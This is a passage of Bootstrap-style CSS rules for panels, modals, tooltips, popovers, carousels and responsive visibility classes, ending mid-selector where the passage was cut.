      .list-group-item-text {
        margin-bottom: 0;
        line-height: 1.3;
      }
      .panel {
        margin-bottom: 20px;
        background-color: #fff;
        border: 1px solid transparent;
        border-radius: 4px;
        -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
        box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
      }
      .panel-body {
        padding: 15px;
      }
      .panel-heading {
        padding: 10px 15px;
        border-bottom: 1px solid transparent;
        border-top-left-radius: 3px;
        border-top-right-radius: 3px;
      }
      .panel-heading > .dropdown .dropdown-toggle {
        color: inherit;
      }
      .panel-title {
        margin-top: 0;
        margin-bottom: 0;
        font-size: 16px;
        color: inherit;
      }
      .panel-title > .small,
      .panel-title > .small > a,
      .panel-title > a,
      .panel-title > small,
      .panel-title > small > a {
        color: inherit;
      }
      .panel-footer {
        padding: 10px 15px;
        background-color: #f5f5f5;
        border-top: 1px solid #ddd;
        border-bottom-right-radius: 3px;
        border-bottom-left-radius: 3px;
      }
      .panel > .list-group,
      .panel > .panel-collapse > .list-group {
        margin-bottom: 0;
      }
      .panel > .list-group .list-group-item,
      .panel > .panel-collapse > .list-group .list-group-item {
        border-width: 1px 0;
        border-radius: 0;
      }
      .panel > .list-group:first-child .list-group-item:first-child,
      .panel > .panel-collapse > .list-group:first-child .list-group-item:first-child {
        border-top: 0;
        border-top-left-radius: 3px;
        border-top-right-radius: 3px;
      }
      .panel > .list-group:last-child .list-group-item:last-child,
      .panel > .panel-collapse > .list-group:last-child .list-group-item:last-child {
        border-bottom: 0;
        border-bottom-right-radius: 3px;
        border-bottom-left-radius: 3px;
      }
      .panel > .panel-heading + .panel-collapse > .list-group .list-group-item:first-child {
        border-top-left-radius: 0;
        border-top-right-radius: 0;
      }
      .panel-heading + .list-group .list-group-item:first-child {
        border-top-width: 0;
      }
      .list-group + .panel-footer {
        border-top-width: 0;
      }
      .panel > .panel-collapse > .table,
      .panel > .table,
      .panel > .table-responsive > .table {
        margin-bottom: 0;
      }
      .panel > .panel-collapse > .table caption,
      .panel > .table caption,
      .panel > .table-responsive > .table caption {
        padding-right: 15px;
        padding-left: 15px;
      }
      .panel > .table-responsive:first-child > .table:first-child,
      .panel > .table:first-child {
        border-top-left-radius: 3px;
        border-top-right-radius: 3px;
      }
      .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child,
      .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child,
      .panel > .table:first-child > tbody:first-child > tr:first-child,
      .panel > .table:first-child > thead:first-child > tr:first-child {
        border-top-left-radius: 3px;
        border-top-right-radius: 3px;
      }
      .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child td:first-child,
      .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child th:first-child,
      .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child td:first-child,
      .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child th:first-child,
      .panel > .table:first-child > tbody:first-child > tr:first-child td:first-child,
      .panel > .table:first-child > tbody:first-child > tr:first-child th:first-child,
      .panel > .table:first-child > thead:first-child > tr:first-child td:first-child,
      .panel > .table:first-child > thead:first-child > tr:first-child th:first-child {
        border-top-left-radius: 3px;
      }
      .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child td:last-child,
      .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child th:last-child,
      .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child td:last-child,
      .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child th:last-child,
      .panel > .table:first-child > tbody:first-child > tr:first-child td:last-child,
      .panel > .table:first-child > tbody:first-child > tr:first-child th:last-child,
      .panel > .table:first-child > thead:first-child > tr:first-child td:last-child,
      .panel > .table:first-child > thead:first-child > tr:first-child th:last-child {
        border-top-right-radius: 3px;
      }
      .panel > .table-responsive:last-child > .table:last-child,
      .panel > .table:last-child {
        border-bottom-right-radius: 3px;
        border-bottom-left-radius: 3px;
      }
      .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child,
      .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child,
      .panel > .table:last-child > tbody:last-child > tr:last-child,
      .panel > .table:last-child > tfoot:last-child > tr:last-child {
        border-bottom-right-radius: 3px;
        border-bottom-left-radius: 3px;
      }
      .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child td:first-child,
      .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child th:first-child,
      .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child td:first-child,
      .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child th:first-child,
      .panel > .table:last-child > tbody:last-child > tr:last-child td:first-child,
      .panel > .table:last-child > tbody:last-child > tr:last-child th:first-child,
      .panel > .table:last-child > tfoot:last-child > tr:last-child td:first-child,
      .panel > .table:last-child > tfoot:last-child > tr:last-child th:first-child {
        border-bottom-left-radius: 3px;
      }
      .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child td:last-child,
      .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child th:last-child,
      .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child td:last-child,
      .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child th:last-child,
      .panel > .table:last-child > tbody:last-child > tr:last-child td:last-child,
      .panel > .table:last-child > tbody:last-child > tr:last-child th:last-child,
      .panel > .table:last-child > tfoot:last-child > tr:last-child td:last-child,
      .panel > .table:last-child > tfoot:last-child > tr:last-child th:last-child {
        border-bottom-right-radius: 3px;
      }
      .panel > .panel-body + .table,
      .panel > .panel-body + .table-responsive,
      .panel > .table + .panel-body,
      .panel > .table-responsive + .panel-body {
        border-top: 1px solid #ddd;
      }
      .panel > .table > tbody:first-child > tr:first-child td,
      .panel > .table > tbody:first-child > tr:first-child th {
        border-top: 0;
      }
      .panel > .table-bordered,
      .panel > .table-responsive > .table-bordered {
        border: 0;
      }
      .panel > .table-bordered > tbody > tr > td:first-child,
      .panel > .table-bordered > tbody > tr > th:first-child,
      .panel > .table-bordered > tfoot > tr > td:first-child,
      .panel > .table-bordered > tfoot > tr > th:first-child,
      .panel > .table-bordered > thead > tr > td:first-child,
      .panel > .table-bordered > thead > tr > th:first-child,
      .panel > .table-responsive > .table-bordered > tbody > tr > td:first-child,
      .panel > .table-responsive > .table-bordered > tbody > tr > th:first-child,
      .panel > .table-responsive > .table-bordered > tfoot > tr > td:first-child,
      .panel > .table-responsive > .table-bordered > tfoot > tr > th:first-child,
      .panel > .table-responsive > .table-bordered > thead > tr > td:first-child,
      .panel > .table-responsive > .table-bordered > thead > tr > th:first-child {
        border-left: 0;
      }
      .panel > .table-bordered > tbody > tr > td:last-child,
      .panel > .table-bordered > tbody > tr > th:last-child,
      .panel > .table-bordered > tfoot > tr > td:last-child,
      .panel > .table-bordered > tfoot > tr > th:last-child,
      .panel > .table-bordered > thead > tr > td:last-child,
      .panel > .table-bordered > thead > tr > th:last-child,
      .panel > .table-responsive > .table-bordered > tbody > tr > td:last-child,
      .panel > .table-responsive > .table-bordered > tbody > tr > th:last-child,
      .panel > .table-responsive > .table-bordered > tfoot > tr > td:last-child,
      .panel > .table-responsive > .table-bordered > tfoot > tr > th:last-child,
      .panel > .table-responsive > .table-bordered > thead > tr > td:last-child,
      .panel > .table-responsive > .table-bordered > thead > tr > th:last-child {
        border-right: 0;
      }
      .panel > .table-bordered > tbody > tr:first-child > td,
      .panel > .table-bordered > tbody > tr:first-child > th,
      .panel > .table-bordered > thead > tr:first-child > td,
      .panel > .table-bordered > thead > tr:first-child > th,
      .panel > .table-responsive > .table-bordered > tbody > tr:first-child > td,
      .panel > .table-responsive > .table-bordered > tbody > tr:first-child > th,
      .panel > .table-responsive > .table-bordered > thead > tr:first-child > td,
      .panel > .table-responsive > .table-bordered > thead > tr:first-child > th {
        border-bottom: 0;
      }
      .panel > .table-bordered > tbody > tr:last-child > td,
      .panel > .table-bordered > tbody > tr:last-child > th,
      .panel > .table-bordered > tfoot > tr:last-child > td,
      .panel > .table-bordered > tfoot > tr:last-child > th,
      .panel > .table-responsive > .table-bordered > tbody > tr:last-child > td,
      .panel > .table-responsive > .table-bordered > tbody > tr:last-child > th,
      .panel > .table-responsive > .table-bordered > tfoot > tr:last-child > td,
      .panel > .table-responsive > .table-bordered > tfoot > tr:last-child > th {
        border-bottom: 0;
      }
      .panel > .table-responsive {
        margin-bottom: 0;
        border: 0;
      }
      .panel-group {
        margin-bottom: 20px;
      }
      .panel-group .panel {
        margin-bottom: 0;
        border-radius: 4px;
      }
      .panel-group .panel + .panel {
        margin-top: 5px;
      }
      .panel-group .panel-heading {
        border-bottom: 0;
      }
      .panel-group .panel-heading + .panel-collapse > .list-group,
      .panel-group .panel-heading + .panel-collapse > .panel-body {
        border-top: 1px solid #ddd;
      }
      .panel-group .panel-footer {
        border-top: 0;
      }
      .panel-group .panel-footer + .panel-collapse .panel-body {
        border-bottom: 1px solid #ddd;
      }
      .panel-default {
        border-color: #ddd;
      }
      .panel-default > .panel-heading {
        color: #333;
        background-color: #f5f5f5;
        border-color: #ddd;
      }
      .panel-default > .panel-heading + .panel-collapse > .panel-body {
        border-top-color: #ddd;
      }
      .panel-default > .panel-heading .badge {
        color: #f5f5f5;
        background-color: #333;
      }
      .panel-default > .panel-footer + .panel-collapse > .panel-body {
        border-bottom-color: #ddd;
      }
      .panel-primary {
        border-color: #337ab7;
      }
      .panel-primary > .panel-heading {
        color: #fff;
        background-color: #337ab7;
        border-color: #337ab7;
      }
      .panel-primary > .panel-heading + .panel-collapse > .panel-body {
        border-top-color: #337ab7;
      }
      .panel-primary > .panel-heading .badge {
        color: #337ab7;
        background-color: #fff;
      }
      .panel-primary > .panel-footer + .panel-collapse > .panel-body {
        border-bottom-color: #337ab7;
      }
      .panel-success {
        border-color: #d6e9c6;
      }
      .panel-success > .panel-heading {
        color: #3c763d;
        background-color: #dff0d8;
        border-color: #d6e9c6;
      }
      .panel-success > .panel-heading + .panel-collapse > .panel-body {
        border-top-color: #d6e9c6;
      }
      .panel-success > .panel-heading .badge {
        color: #dff0d8;
        background-color: #3c763d;
      }
      .panel-success > .panel-footer + .panel-collapse > .panel-body {
        border-bottom-color: #d6e9c6;
      }
      .panel-info {
        border-color: #bce8f1;
      }
      .panel-info > .panel-heading {
        color: #31708f;
        background-color: #d9edf7;
        border-color: #bce8f1;
      }
      .panel-info > .panel-heading + .panel-collapse > .panel-body {
        border-top-color: #bce8f1;
      }
      .panel-info > .panel-heading .badge {
        color: #d9edf7;
        background-color: #31708f;
      }
      .panel-info > .panel-footer + .panel-collapse > .panel-body {
        border-bottom-color: #bce8f1;
      }
      .panel-warning {
        border-color: #faebcc;
      }
      .panel-warning > .panel-heading {
        color: #8a6d3b;
        background-color: #fcf8e3;
        border-color: #faebcc;
      }
      .panel-warning > .panel-heading + .panel-collapse > .panel-body {
        border-top-color: #faebcc;
      }
      .panel-warning > .panel-heading .badge {
        color: #fcf8e3;
        background-color: #8a6d3b;
      }
      .panel-warning > .panel-footer + .panel-collapse > .panel-body {
        border-bottom-color: #faebcc;
      }
      .panel-danger {
        border-color: #ebccd1;
      }
      .panel-danger > .panel-heading {
        color: #a94442;
        background-color: #f2dede;
        border-color: #ebccd1;
      }
      .panel-danger > .panel-heading + .panel-collapse > .panel-body {
        border-top-color: #ebccd1;
      }
      .panel-danger > .panel-heading .badge {
        color: #f2dede;
        background-color: #a94442;
      }
      .panel-danger > .panel-footer + .panel-collapse > .panel-body {
        border-bottom-color: #ebccd1;
      }
      .embed-responsive {
        position: relative;
        display: block;
        height: 0;
        padding: 0;
        overflow: hidden;
      }
      .embed-responsive .embed-responsive-item,
      .embed-responsive embed,
      .embed-responsive iframe,
      .embed-responsive object,
      .embed-responsive video {
        position: absolute;
        top: 0;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: 0;
      }
      .embed-responsive-16by9 {
        padding-bottom: 56.25%;
      }
      .embed-responsive-4by3 {
        padding-bottom: 75%;
      }
      .well {
        min-height: 20px;
        padding: 19px;
        margin-bottom: 20px;
        background-color: #f5f5f5;
        border: 1px solid #e3e3e3;
        border-radius: 4px;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.05);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.05);
      }
      .well blockquote {
        border-color: #ddd;
        border-color: rgba(0, 0, 0, 0.15);
      }
      .well-lg {
        padding: 24px;
        border-radius: 6px;
      }
      .well-sm {
        padding: 9px;
        border-radius: 3px;
      }
      .close {
        float: right;
        font-size: 21px;
        font-weight: 700;
        line-height: 1;
        color: #000;
        text-shadow: 0 1px 0 #fff;
        filter: alpha(opacity=20);
        opacity: 0.2;
      }
      .close:focus,
      .close:hover {
        color: #000;
        text-decoration: none;
        cursor: pointer;
        filter: alpha(opacity=50);
        opacity: 0.5;
      }
      button.close {
        -webkit-appearance: none;
        padding: 0;
        cursor: pointer;
        background: 0 0;
        border: 0;
      }
      .modal-open {
        overflow: hidden;
      }
      .modal {
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 1050;
        display: none;
        overflow: hidden;
        -webkit-overflow-scrolling: touch;
        outline: 0;
      }
      .modal.fade .modal-dialog {
        -webkit-transition: -webkit-transform 0.3s ease-out;
        -o-transition: -o-transform 0.3s ease-out;
        transition: transform 0.3s ease-out;
        -webkit-transform: translate(0, -25%);
        -ms-transform: translate(0, -25%);
        -o-transform: translate(0, -25%);
        transform: translate(0, -25%);
      }
      .modal.in .modal-dialog {
        -webkit-transform: translate(0, 0);
        -ms-transform: translate(0, 0);
        -o-transform: translate(0, 0);
        transform: translate(0, 0);
      }
      .modal-open .modal {
        overflow-x: hidden;
        overflow-y: auto;
      }
      .modal-dialog {
        position: relative;
        width: auto;
        margin: 10px;
      }
      .modal-content {
        position: relative;
        background-color: #fff;
        -webkit-background-clip: padding-box;
        background-clip: padding-box;
        border: 1px solid #999;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
        outline: 0;
        -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
        box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
      }
      .modal-backdrop {
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 1040;
        background-color: #000;
      }
      .modal-backdrop.fade {
        filter: alpha(opacity=0);
        opacity: 0;
      }
      .modal-backdrop.in {
        filter: alpha(opacity=50);
        opacity: 0.5;
      }
      .modal-header {
        padding: 15px;
        border-bottom: 1px solid #e5e5e5;
      }
      .modal-header .close {
        margin-top: -2px;
      }
      .modal-title {
        margin: 0;
        line-height: 1.42857143;
      }
      .modal-body {
        position: relative;
        padding: 15px;
      }
      .modal-footer {
        padding: 15px;
        text-align: right;
        border-top: 1px solid #e5e5e5;
      }
      .modal-footer .btn + .btn {
        margin-bottom: 0;
        margin-left: 5px;
      }
      .modal-footer .btn-group .btn + .btn {
        margin-left: -1px;
      }
      .modal-footer .btn-block + .btn-block {
        margin-left: 0;
      }
      .modal-scrollbar-measure {
        position: absolute;
        top: -9999px;
        width: 50px;
        height: 50px;
        overflow: scroll;
      }
      @media (min-width: 768px) {
        .modal-dialog {
          width: 600px;
          margin: 30px auto;
        }
        .modal-content {
          -webkit-box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
          box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
        }
        .modal-sm {
          width: 300px;
        }
      }
      @media (min-width: 992px) {
        .modal-lg {
          width: 900px;
        }
      }
      .tooltip {
        position: absolute;
        z-index: 1070;
        display: block;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        font-size: 12px;
        font-style: normal;
        font-weight: 400;
        line-height: 1.42857143;
        text-align: left;
        text-align: start;
        text-decoration: none;
        text-shadow: none;
        text-transform: none;
        letter-spacing: normal;
        word-break: normal;
        word-spacing: normal;
        word-wrap: normal;
        white-space: normal;
        filter: alpha(opacity=0);
        opacity: 0;
        line-break: auto;
      }
      .tooltip.in {
        filter: alpha(opacity=90);
        opacity: 0.9;
      }
      .tooltip.top {
        padding: 5px 0;
        margin-top: -3px;
      }
      .tooltip.right {
        padding: 0 5px;
        margin-left: 3px;
      }
      .tooltip.bottom {
        padding: 5px 0;
        margin-top: 3px;
      }
      .tooltip.left {
        padding: 0 5px;
        margin-left: -3px;
      }
      .tooltip-inner {
        max-width: 200px;
        padding: 3px 8px;
        color: #fff;
        text-align: center;
        background-color: #000;
        border-radius: 4px;
      }
      .tooltip-arrow {
        position: absolute;
        width: 0;
        height: 0;
        border-color: transparent;
        border-style: solid;
      }
      .tooltip.top .tooltip-arrow {
        bottom: 0;
        left: 50%;
        margin-left: -5px;
        border-width: 5px 5px 0;
        border-top-color: #000;
      }
      .tooltip.top-left .tooltip-arrow {
        right: 5px;
        bottom: 0;
        margin-bottom: -5px;
        border-width: 5px 5px 0;
        border-top-color: #000;
      }
      .tooltip.top-right .tooltip-arrow {
        bottom: 0;
        left: 5px;
        margin-bottom: -5px;
        border-width: 5px 5px 0;
        border-top-color: #000;
      }
      .tooltip.right .tooltip-arrow {
        top: 50%;
        left: 0;
        margin-top: -5px;
        border-width: 5px 5px 5px 0;
        border-right-color: #000;
      }
      .tooltip.left .tooltip-arrow {
        top: 50%;
        right: 0;
        margin-top: -5px;
        border-width: 5px 0 5px 5px;
        border-left-color: #000;
      }
      .tooltip.bottom .tooltip-arrow {
        top: 0;
        left: 50%;
        margin-left: -5px;
        border-width: 0 5px 5px;
        border-bottom-color: #000;
      }
      .tooltip.bottom-left .tooltip-arrow {
        top: 0;
        right: 5px;
        margin-top: -5px;
        border-width: 0 5px 5px;
        border-bottom-color: #000;
      }
      .tooltip.bottom-right .tooltip-arrow {
        top: 0;
        left: 5px;
        margin-top: -5px;
        border-width: 0 5px 5px;
        border-bottom-color: #000;
      }
      .popover {
        position: absolute;
        top: 0;
        left: 0;
        z-index: 1060;
        display: none;
        max-width: 276px;
        padding: 1px;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        font-size: 14px;
        font-style: normal;
        font-weight: 400;
        line-height: 1.42857143;
        text-align: left;
        text-align: start;
        text-decoration: none;
        text-shadow: none;
        text-transform: none;
        letter-spacing: normal;
        word-break: normal;
        word-spacing: normal;
        word-wrap: normal;
        white-space: normal;
        background-color: #fff;
        -webkit-background-clip: padding-box;
        background-clip: padding-box;
        border: 1px solid #ccc;
        border: 1px solid rgba(0, 0, 0, 0.2);
        border-radius: 6px;
        -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
        box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
        line-break: auto;
      }
      .popover.top {
        margin-top: -10px;
      }
      .popover.right {
        margin-left: 10px;
      }
      .popover.bottom {
        margin-top: 10px;
      }
      .popover.left {
        margin-left: -10px;
      }
      .popover-title {
        padding: 8px 14px;
        margin: 0;
        font-size: 14px;
        background-color: #f7f7f7;
        border-bottom: 1px solid #ebebeb;
        border-radius: 5px 5px 0 0;
      }
      .popover-content {
        padding: 9px 14px;
      }
      .popover > .arrow,
      .popover > .arrow:after {
        position: absolute;
        display: block;
        width: 0;
        height: 0;
        border-color: transparent;
        border-style: solid;
      }
      .popover > .arrow {
        border-width: 11px;
      }
      .popover > .arrow:after {
        content: "";
        border-width: 10px;
      }
      .popover.top > .arrow {
        bottom: -11px;
        left: 50%;
        margin-left: -11px;
        border-top-color: #999;
        border-top-color: rgba(0, 0, 0, 0.25);
        border-bottom-width: 0;
      }
      .popover.top > .arrow:after {
        bottom: 1px;
        margin-left: -10px;
        content: " ";
        border-top-color: #fff;
        border-bottom-width: 0;
      }
      .popover.right > .arrow {
        top: 50%;
        left: -11px;
        margin-top: -11px;
        border-right-color: #999;
        border-right-color: rgba(0, 0, 0, 0.25);
        border-left-width: 0;
      }
      .popover.right > .arrow:after {
        bottom: -10px;
        left: 1px;
        content: " ";
        border-right-color: #fff;
        border-left-width: 0;
      }
      .popover.bottom > .arrow {
        top: -11px;
        left: 50%;
        margin-left: -11px;
        border-top-width: 0;
        border-bottom-color: #999;
        border-bottom-color: rgba(0, 0, 0, 0.25);
      }
      .popover.bottom > .arrow:after {
        top: 1px;
        margin-left: -10px;
        content: " ";
        border-top-width: 0;
        border-bottom-color: #fff;
      }
      .popover.left > .arrow {
        top: 50%;
        right: -11px;
        margin-top: -11px;
        border-right-width: 0;
        border-left-color: #999;
        border-left-color: rgba(0, 0, 0, 0.25);
      }
      .popover.left > .arrow:after {
        right: 1px;
        bottom: -10px;
        content: " ";
        border-right-width: 0;
        border-left-color: #fff;
      }
      .carousel {
        position: relative;
      }
      .carousel-inner {
        position: relative;
        width: 100%;
        overflow: hidden;
      }
      .carousel-inner > .item {
        position: relative;
        display: none;
        -webkit-transition: 0.6s ease-in-out left;
        -o-transition: 0.6s ease-in-out left;
        transition: 0.6s ease-in-out left;
      }
      .carousel-inner > .item > a > img,
      .carousel-inner > .item > img {
        line-height: 1;
      }
      @media all and (transform-3d), (-webkit-transform-3d) {
        .carousel-inner > .item {
          -webkit-transition: -webkit-transform 0.6s ease-in-out;
          -o-transition: -o-transform 0.6s ease-in-out;
          transition: transform 0.6s ease-in-out;
          -webkit-backface-visibility: hidden;
          backface-visibility: hidden;
          -webkit-perspective: 1000px;
          perspective: 1000px;
        }
        .carousel-inner > .item.active.right,
        .carousel-inner > .item.next {
          left: 0;
          -webkit-transform: translate3d(100%, 0, 0);
          transform: translate3d(100%, 0, 0);
        }
        .carousel-inner > .item.active.left,
        .carousel-inner > .item.prev {
          left: 0;
          -webkit-transform: translate3d(-100%, 0, 0);
          transform: translate3d(-100%, 0, 0);
        }
        .carousel-inner > .item.active,
        .carousel-inner > .item.next.left,
        .carousel-inner > .item.prev.right {
          left: 0;
          -webkit-transform: translate3d(0, 0, 0);
          transform: translate3d(0, 0, 0);
        }
      }
      .carousel-inner > .active,
      .carousel-inner > .next,
      .carousel-inner > .prev {
        display: block;
      }
      .carousel-inner > .active {
        left: 0;
      }
      .carousel-inner > .next,
      .carousel-inner > .prev {
        position: absolute;
        top: 0;
        width: 100%;
      }
      .carousel-inner > .next {
        left: 100%;
      }
      .carousel-inner > .prev {
        left: -100%;
      }
      .carousel-inner > .next.left,
      .carousel-inner > .prev.right {
        left: 0;
      }
      .carousel-inner > .active.left {
        left: -100%;
      }
      .carousel-inner > .active.right {
        left: 100%;
      }
      .carousel-control {
        position: absolute;
        top: 0;
        bottom: 0;
        left: 0;
        width: 15%;
        font-size: 20px;
        color: #fff;
        text-align: center;
        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
        background-color: rgba(0, 0, 0, 0);
        filter: alpha(opacity=50);
        opacity: 0.5;
      }
      .carousel-control.left {
        background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0.5) 0, rgba(0, 0, 0, 0.0001) 100%);
        background-image: -o-linear-gradient(left, rgba(0, 0, 0, 0.5) 0, rgba(0, 0, 0, 0.0001) 100%);
        background-image: -webkit-gradient(linear, left top, right top, from(rgba(0, 0, 0, 0.5)), to(rgba(0, 0, 0, 0.0001)));
        background-image: linear-gradient(to right, rgba(0, 0, 0, 0.5) 0, rgba(0, 0, 0, 0.0001) 100%);
        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1);
        background-repeat: repeat-x;
      }
      .carousel-control.right {
        right: 0;
        left: auto;
        background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0.0001) 0, rgba(0, 0, 0, 0.5) 100%);
        background-image: -o-linear-gradient(left, rgba(0, 0, 0, 0.0001) 0, rgba(0, 0, 0, 0.5) 100%);
        background-image: -webkit-gradient(linear, left top, right top, from(rgba(0, 0, 0, 0.0001)), to(rgba(0, 0, 0, 0.5)));
        background-image: linear-gradient(to right, rgba(0, 0, 0, 0.0001) 0, rgba(0, 0, 0, 0.5) 100%);
        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1);
        background-repeat: repeat-x;
      }
      .carousel-control:focus,
      .carousel-control:hover {
        color: #fff;
        text-decoration: none;
        filter: alpha(opacity=90);
        outline: 0;
        opacity: 0.9;
      }
      .carousel-control .glyphicon-chevron-left,
      .carousel-control .glyphicon-chevron-right,
      .carousel-control .icon-next,
      .carousel-control .icon-prev {
        position: absolute;
        top: 50%;
        z-index: 5;
        display: inline-block;
        margin-top: -10px;
      }
      .carousel-control .glyphicon-chevron-left,
      .carousel-control .icon-prev {
        left: 50%;
        margin-left: -10px;
      }
      .carousel-control .glyphicon-chevron-right,
      .carousel-control .icon-next {
        right: 50%;
        margin-right: -10px;
      }
      .carousel-control .icon-next,
      .carousel-control .icon-prev {
        width: 20px;
        height: 20px;
        font-family: serif;
        line-height: 1;
      }
      .carousel-control .icon-prev:before {
        content: "\2039";
      }
      .carousel-control .icon-next:before {
        content: "\203a";
      }
      .carousel-indicators {
        position: absolute;
        bottom: 10px;
        left: 50%;
        z-index: 15;
        width: 60%;
        padding-left: 0;
        margin-left: -30%;
        text-align: center;
        list-style: none;
      }
      .carousel-indicators li {
        display: inline-block;
        width: 10px;
        height: 10px;
        margin: 1px;
        text-indent: -999px;
        cursor: pointer;
        background-color: #000\9;
        background-color: rgba(0, 0, 0, 0);
        border: 1px solid #fff;
        border-radius: 10px;
      }
      .carousel-indicators .active {
        width: 12px;
        height: 12px;
        margin: 0;
        background-color: #fff;
      }
      .carousel-caption {
        position: absolute;
        right: 15%;
        bottom: 20px;
        left: 15%;
        z-index: 10;
        padding-top: 20px;
        padding-bottom: 20px;
        color: #fff;
        text-align: center;
        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
      }
      .carousel-caption .btn {
        text-shadow: none;
      }
      @media screen and (min-width: 768px) {
        .carousel-control .glyphicon-chevron-left,
        .carousel-control .glyphicon-chevron-right,
        .carousel-control .icon-next,
        .carousel-control .icon-prev {
          width: 30px;
          height: 30px;
          margin-top: -10px;
          font-size: 30px;
        }
        .carousel-control .glyphicon-chevron-left,
        .carousel-control .icon-prev {
          margin-left: -10px;
        }
        .carousel-control .glyphicon-chevron-right,
        .carousel-control .icon-next {
          margin-right: -10px;
        }
        .carousel-caption {
          right: 20%;
          left: 20%;
          padding-bottom: 30px;
        }
        .carousel-indicators {
          bottom: 20px;
        }
      }
      .btn-group-vertical > .btn-group:after,
      .btn-group-vertical > .btn-group:before,
      .btn-toolbar:after,
      .btn-toolbar:before,
      .clearfix:after,
      .clearfix:before,
      .container-fluid:after,
      .container-fluid:before,
      .container:after,
      .container:before,
      .dl-horizontal dd:after,
      .dl-horizontal dd:before,
      .form-horizontal .form-group:after,
      .form-horizontal .form-group:before,
      .modal-footer:after,
      .modal-footer:before,
      .modal-header:after,
      .modal-header:before,
      .nav:after,
      .nav:before,
      .navbar-collapse:after,
      .navbar-collapse:before,
      .navbar-header:after,
      .navbar-header:before,
      .navbar:after,
      .navbar:before,
      .pager:after,
      .pager:before,
      .panel-body:after,
      .panel-body:before,
      .row:after,
      .row:before {
        display: table;
        content: " ";
      }
      .btn-group-vertical > .btn-group:after,
      .btn-toolbar:after,
      .clearfix:after,
      .container-fluid:after,
      .container:after,
      .dl-horizontal dd:after,
      .form-horizontal .form-group:after,
      .modal-footer:after,
      .modal-header:after,
      .nav:after,
      .navbar-collapse:after,
      .navbar-header:after,
      .navbar:after,
      .pager:after,
      .panel-body:after,
      .row:after {
        clear: both;
      }
      .center-block {
        display: block;
        margin-right: auto;
        margin-left: auto;
      }
      .pull-right {
        float: right !important;
      }
      .pull-left {
        float: left !important;
      }
      .hide {
        display: none !important;
      }
      .show {
        display: block !important;
      }
      .invisible {
        visibility: hidden;
      }
      .text-hide {
        font: 0/0 a;
        color: transparent;
        text-shadow: none;
        background-color: transparent;
        border: 0;
      }
      .hidden {
        display: none !important;
      }
      .affix {
        position: fixed;
      }
      @-ms-viewport {
        width: device-width;
      }
      .visible-lg,
      .visible-md,
      .visible-sm,
      .visible-xs {
        display: none !important;
      }
      .visible-lg-block,
      .visible-lg-inline,
      .visible-lg-inline-block,
      .visible-md-block,
      .visible-md-inline,
      .visible-md-inline-block,
      .visible-sm-block,
      .visible-sm-inline,
      .visible-sm-inline-block,
      .visible-xs-block,
      .visible-xs-inline,
      .visible-xs-inline-block {
        display: none !important;
      }
      @media (max-width: 767px) {
        .visible-xs {
          display: block !important;
        }
        table.visible-xs {
          display: table !important;
        }
        tr.visible-xs {
          display: table-row !important;
        }
        td.visible-xs,
        th.visible-xs {
          display: table-cell !important;
        }
      }
      @media (max-width: 767px) {
        .visible-xs-block {
          display: block !important;
        }
      }
      @media (max-width: 767px) {
        .visible-xs-inline {
          display: inline !important;
        }
      }
      @media (max-width: 767px) {
        .visible-xs-inline-block {
          display: inline-block !important;
        }
      }
      @media (min-width: 768px) and (max-width: 991px) {
        .visible-sm {
          display: block !important;
        }
        table.visible-sm {
          display: table !important;
        }
        tr.visible-sm {
          display: table-row !important;
        }
        td.visible-sm,
        th.visible-sm {
          display: table-cell !important;
        }
      }
      @media (min-width: 768px) and (max-width: 991px) {
        .visible-sm-block {
          display: block !important;
        }
      }
      @media (min-width: 768px) and (max-width: 991px) {
        .visible-sm-inline {
          display: inline !important;
        }
      }
      @media (min-width: 768px) and (max-width: 991px) {
        .visible-sm-inline-block {
          display: inline-block !important;
        }
      }
      @media (min-width: 992px) and (max-width: 1199px) {
        .visible-md {
          display: block !important;
        }
        table.visible-md {
          display: table !important;
        }
        tr.visible-md {
          display: table-row !important;
        }
        td.visible-md,
